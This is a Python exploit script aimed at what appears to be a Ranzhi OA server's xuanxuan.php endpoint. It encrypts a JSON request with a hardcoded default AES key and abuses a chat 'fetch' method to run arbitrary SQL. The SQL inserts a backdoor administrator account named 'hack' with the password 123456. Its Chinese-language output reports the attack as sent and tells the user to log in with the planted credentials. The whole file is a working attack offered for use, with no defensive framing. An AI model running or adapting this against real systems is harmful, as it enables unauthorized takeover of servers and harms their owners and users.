import requests
import json
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64
import sys

target_url = "http://10.16.1.211/ranzhi/www/xuanxuan.php"

# AES密钥（默认）
AES_KEY = b'88888888888888888888888888888888'
iv = AES_KEY[:16]  # 默认IV为密钥前16字节

def encrypt(data):
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return base64.b64encode(encrypted).decode('utf-8')

# 要执行的SQL（插入管理员）
sql = "INSERT INTO `sys_user` (`account`, `password`, `realname`, `role`) VALUES ('hack', 'e10adc3949ba59abbe56e057f20f883e', 'hack', 'admin')"

# 构造payload
payload = {
    "userID": "123",
    "module": "chat",
    "method": "fetch",
    "params": {
        "0": "baseDAO",
        "1": "query",
        "2": sql,
        "3": "sys"
    }
}

try:
    data = json.dumps(payload)
    encrypted_data = encrypt(data)

    response = requests.post(target_url, data=encrypted_data, timeout=10)
    print(f"[*] 状态码: {response.status_code}")
    print(f"[*] 响应内容: {response.text[:500]}")

    if response.status_code == 200:
        print("[+] 攻击请求已发送成功")
        print("[+] 请尝试使用账号 hack / 密码 123456 登录")
    else:
        print(f"[-] 服务器返回异常状态码: {response.status_code}")

except requests.exceptions.Timeout:
    print("[-] 连接超时，目标不可达")
    sys.exit(1)
except requests.exceptions.ConnectionError:
    print("[-] 连接失败，目标不可达或端口未开放")
    sys.exit(1)
except Exception as e:
    print(f"[-] 发生错误: {e}")
    sys.exit(1)